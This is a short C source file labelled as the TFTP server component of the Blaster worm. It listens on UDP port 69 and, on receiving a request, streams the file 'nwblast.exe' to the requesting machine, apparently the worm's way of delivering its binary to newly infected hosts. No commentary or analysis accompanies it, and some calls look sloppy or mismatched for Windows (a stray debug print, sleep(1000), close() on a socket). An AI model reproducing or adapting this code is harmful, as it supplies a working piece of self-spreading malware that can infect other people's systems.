/* Blaster: server TFTPD */

#include <stdio.h>
#include <winsock2.h>

int main(int argc, char *argv[])
{
  FILE *tftp_file;              /* pointer to the file to be sent	*/
  int tftp_send_len;            /* packet size				*/
  char tftp_recv_buf[516];      /* data receive buffer			*/
  struct sockaddr_in tftp_addr; /* for bind()				*/
  char tftp_from[16];           /* recvfrom() address			*/
  int tftp_addr_len;            /* address size				*/
  char tftp_send_buf[516];      /* data send buffer			*/

  WORD wVersionRequested;
  WSADATA WSAData;
  wVersionRequested = MAKEWORD(1, 1);
  WSAStartup(wVersionRequested, &WSAData);
  /* listening socket */
  int tftp_sock = socket(PF_INET, SOCK_DGRAM, 0);
  if (tftp_sock != -1)
  {
    /* clear the structure */
    memset((void *)&tftp_addr, 0, sizeof(tftp_addr));

    tftp_addr.sin_family = PF_INET;
    /* standard tftp port */
    tftp_addr.sin_port = htons(69);
    /* as before */
    tftp_addr.sin_addr.s_addr = 0;

    /* attach to TFTPD port */
    if (bind(tftp_sock, (struct sockaddr *)&tftp_addr,
             sizeof(tftp_addr)) == 0)
    {
      tftp_addr_len = 16;

      /* waiting for command, sending file as a response */
      if (recvfrom(tftp_sock, tftp_recv_buf, sizeof(tftp_recv_buf), 0,
                   (void *)tftp_from, &tftp_addr_len) >= 1)
      {
        /* correct register int */
        int tftp_count = 0;

        /* "rb" for windows */
        tftp_file = fopen("nwblast.exe", "rb");
        if (tftp_file)
        {
          while (1)
          {
            tftp_count++;
            printf("gg");
            /* tftp data packet */
            *(short *)tftp_send_buf = htons(3);
            /* sequential number */
            *(short *)(tftp_send_buf + 2) = htons(tftp_count);

            /* data read + 4 bytes of header */
            tftp_send_len = fread(&tftp_send_buf[4], 1, 512, tftp_file) + 4;

            /* sending */
            if (sendto(tftp_sock, tftp_send_buf, tftp_send_len, 0,
                       (void *)tftp_from, tftp_addr_len) < 1)
              goto out;

            sleep(1000);

            /* end of file, probably */
            if (tftp_send_len < 516)
              break;
          }

          fclose(tftp_file);
          tftp_file = NULL;
        out:
          /* if sendto fails, here's where we end up */
          if (tftp_file)
            fclose(tftp_file);
        }
      }
    }
  }

  close(tftp_sock);

  return 0;
}
